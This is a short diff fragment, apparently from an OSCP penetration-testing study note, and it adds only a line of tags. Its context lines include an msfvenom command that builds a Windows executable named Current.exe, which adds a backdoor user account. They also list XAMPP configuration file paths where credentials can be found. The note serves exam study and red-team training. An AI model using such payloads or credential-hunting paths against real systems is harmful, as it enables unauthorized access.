@@ -815,3 +815,4 @@ msfvenom -p windows/adduser USER=chw PASS=chw -f exe -o Current.exe
     - `C:\xampp\mysql\bin\*.ini`
     - `C:\xampp\*.txt`
 
+##### tags: `offsec` `oscp` `oscp+` `web security` `pentesting` `red team`
